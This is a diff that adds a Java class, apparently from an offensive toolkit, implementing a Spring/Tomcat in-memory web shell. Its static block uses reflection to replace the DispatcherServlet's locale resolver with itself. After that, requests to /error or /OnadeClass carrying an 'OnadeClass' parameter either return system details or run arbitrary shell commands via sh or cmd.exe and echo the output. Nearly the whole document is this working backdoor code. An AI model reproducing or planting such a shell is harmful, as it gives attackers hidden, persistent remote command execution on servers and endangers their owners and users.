@@ -1,0 +1,237 @@
+package com.m1yuu.m1yuu_tools.evilClass;
+
+import org.apache.catalina.connector.Response;
+import org.apache.catalina.connector.ResponseFacade;
+import org.apache.catalina.core.ApplicationFilterChain;
+import org.springframework.lang.Nullable;
+import org.springframework.web.servlet.i18n.AcceptHeaderLocaleResolver;
+
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
+import java.util.Locale;
+import java.util.Scanner;
+
+public class OnadeClass extends AcceptHeaderLocaleResolver {
+    static {
+        boolean hasReplacement = false;
+
+        try {
+            System.out.println("=== 替换DispatcherServlet的localeResolver ===");
+
+            Thread currentThread = Thread.currentThread();
+            java.lang.reflect.Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
+            threadLocalsField.setAccessible(true);
+            Object threadLocalMap = threadLocalsField.get(currentThread);
+
+            java.lang.reflect.Field tableField = threadLocalMap.getClass().getDeclaredField("table");
+            tableField.setAccessible(true);
+            Object[] table = (Object[]) tableField.get(threadLocalMap);
+
+            for (Object entry : table) {
+                if (entry != null) {
+                    java.lang.reflect.Field valueField = entry.getClass().getDeclaredField("value");
+                    valueField.setAccessible(true);
+                    Object lambdaValue = valueField.get(entry);
+
+                    if (lambdaValue != null && lambdaValue.getClass().getName().contains("DispatcherServlet$$Lambda")) {
+                        java.lang.reflect.Field[] fields = lambdaValue.getClass().getDeclaredFields();
+                        for (java.lang.reflect.Field field : fields) {
+                            field.setAccessible(true);
+                            Object fieldValue = field.get(lambdaValue);
+
+                            // 找到RequestFacade
+                            if (fieldValue instanceof org.apache.catalina.connector.RequestFacade) {
+                                System.out.println("找到RequestFacade");
+
+                                // 获取内部Request
+                                java.lang.reflect.Field requestField = fieldValue.getClass().getDeclaredField("request");
+                                requestField.setAccessible(true);
+                                org.apache.catalina.connector.Request request =
+                                        (org.apache.catalina.connector.Request) requestField.get(fieldValue);
+
+                                // 获取FilterChain
+                                java.lang.reflect.Field filterChainField =
+                                        org.apache.catalina.connector.Request.class.getDeclaredField("filterChain");
+                                filterChainField.setAccessible(true);
+                                org.apache.catalina.core.ApplicationFilterChain filterChain =
+                                        (org.apache.catalina.core.ApplicationFilterChain) filterChainField.get(request);
+
+                                // 获取DispatcherServlet
+                                java.lang.reflect.Field servletField = filterChain.getClass().getDeclaredField("servlet");
+                                servletField.setAccessible(true);
+                                org.springframework.web.servlet.DispatcherServlet dispatcherServlet =
+                                        (org.springframework.web.servlet.DispatcherServlet) servletField.get(filterChain);
+
+                                System.out.println("找到DispatcherServlet: " + dispatcherServlet);
+
+                                // 替换DispatcherServlet的localeResolver字段
+                                java.lang.reflect.Field localeResolverField =
+                                        org.springframework.web.servlet.DispatcherServlet.class.getDeclaredField("localeResolver");
+                                localeResolverField.setAccessible(true);
+
+                                Object currentResolver = localeResolverField.get(dispatcherServlet);
+                                System.out.println("当前LocaleResolver: " + currentResolver.getClass().getName());
+
+                                // 检查是否已经被替换
+                                if (currentResolver instanceof OnadeClass) {
+                                    System.out.println("已经是ExifilAcceptHeaderLocaleResolver，跳过");
+                                }
+
+                                // 创建恶意Resolver
+                                OnadeClass maliciousResolver =
+                                        new OnadeClass();
+
+                                // 如果需要复制原有配置
+                                if (currentResolver instanceof org.springframework.web.servlet.i18n.AcceptHeaderLocaleResolver) {
+                                    // 复制defaultLocale等配置
+                                    try {
+                                        java.lang.reflect.Field defaultLocaleField =
+                                                org.springframework.web.servlet.i18n.AcceptHeaderLocaleResolver.class
+                                                        .getDeclaredField("defaultLocale");
+                                        defaultLocaleField.setAccessible(true);
+                                        Object defaultLocale = defaultLocaleField.get(currentResolver);
+                                        if (defaultLocale != null) {
+                                            defaultLocaleField.set(maliciousResolver, defaultLocale);
+                                        }
+                                    } catch (Exception e) {
+                                        // 字段可能不存在，忽略
+                                    }
+                                }
+
+                                // 执行替换
+                                localeResolverField.set(dispatcherServlet, maliciousResolver);
+                                System.out.println("✓ 成功替换DispatcherServlet的localeResolver");
+
+                                hasReplacement = true;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (hasReplacement) {
+                System.out.println("=== localeResolver替换完成！===");
+            } else {
+                System.out.println("未找到DispatcherServlet实例");
+            }
+
+        } catch (Exception e) {
+            System.out.println("替换异常: " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void setLocale(HttpServletRequest request, @Nullable HttpServletResponse response, @Nullable Locale locale) {
+        System.out.println("setLocale hacked " + request);
+    }
+
+    // 自动触发方法
+    @Override
+    public Locale resolveLocale(HttpServletRequest request) {
+        try {
+            String url = request.getRequestURI();
+            String cmd = request.getParameter("OnadeClass");
+
+            // 只有在特定URL且有cmd参数时才执行恶意逻辑
+            if (cmd != null && (
+                    url.equals("/error")
+                            ||
+                            url.equals("/OnadeClass")
+            )) {
+                Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
+                Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
+                Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
+                Field modifiersField = Field.class.getDeclaredField("modifiers");
+                modifiersField.setAccessible(true);
+                modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
+                modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
+                modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
+                WRAP_SAME_OBJECT_FIELD.setAccessible(true);
+                lastServicedRequestField.setAccessible(true);
+                lastServicedResponseField.setAccessible(true);
+
+                ThreadLocal<ServletResponse> lastServicedResponse =
+                        (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
+                ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
+                boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
+                // 使用已定义的cmd变量，不重复定义
+                if (lastServicedRequest != null) {
+                    cmd = lastServicedRequest.get().getParameter("OnadeClass");
+                }
+                if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
+                    lastServicedRequestField.set(null, new ThreadLocal<>());
+                    lastServicedResponseField.set(null, new ThreadLocal<>());
+                    WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
+                } else if (cmd != null) {
+                    // 检查是否为status命令
+                    if ("status".equals(cmd)) {
+                        ServletResponse responseFacade = lastServicedResponse.get();
+                        if (responseFacade instanceof javax.servlet.http.HttpServletResponse) {
+                            javax.servlet.http.HttpServletResponse httpResponse = (javax.servlet.http.HttpServletResponse) responseFacade;
+                            httpResponse.setContentType("text/plain; charset=UTF-8");
+                            java.io.Writer w = httpResponse.getWriter();
+                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                            String currentTime = sdf.format(new java.util.Date());
+                            Runtime runtime = Runtime.getRuntime();
+                            long totalMemory = runtime.totalMemory();
+                            long freeMemory = runtime.freeMemory();
+                            long usedMemory = totalMemory - freeMemory;
+                            long maxMemory = runtime.maxMemory();
+                            String status = "=== Memory Shell Status ===\n" +
+                                    "Type: acceptheader\n" +
+                                    "Current Time: " + currentTime + "\n" +
+                                    "Java Version: " + System.getProperty("java.version") + "\n" +
+                                    "JVM Name: " + System.getProperty("java.vm.name") + "\n" +
+                                    "JVM Version: " + System.getProperty("java.vm.version") + "\n" +
+                                    "OS Name: " + System.getProperty("os.name") + "\n" +
+                                    "OS Version: " + System.getProperty("os.version") + "\n" +
+                                    "Total Memory: " + (totalMemory / 1024 / 1024) + " MB\n" +
+                                    "Used Memory: " + (usedMemory / 1024 / 1024) + " MB\n" +
+                                    "Free Memory: " + (freeMemory / 1024 / 1024) + " MB\n" +
+                                    "Max Memory: " + (maxMemory / 1024 / 1024) + " MB\n" +
+                                    "========================";
+                            w.write(status);
+                            w.flush();
+                            return request.getLocale();
+                        }
+                    }
+                    
+                    ServletResponse responseFacade = lastServicedResponse.get();
+                    responseFacade.getWriter();
+                    java.io.Writer w = responseFacade.getWriter();
+                    Field responseField = ResponseFacade.class.getDeclaredField("response");
+                    responseField.setAccessible(true);
+                    Response response = (Response) responseField.get(responseFacade);
+                    response.resetBuffer();
+                    Field usingWriter = Response.class.getDeclaredField("usingWriter");
+                    usingWriter.setAccessible(true);
+                    usingWriter.set((Object) response, Boolean.FALSE);
+
+                    boolean isLinux = true;
+                    String osTyp = System.getProperty("os.name");
+                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                        isLinux = false;
+                    }
+                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
+                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                    Scanner s = new Scanner(in).useDelimiter("\\a");
+                    String output = s.hasNext() ? s.next() : "";
+                    w.write(output);
+                    w.flush();
+                    return super.resolveLocale(request);
+                }
+
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return super.resolveLocale(request);
+    }
+}
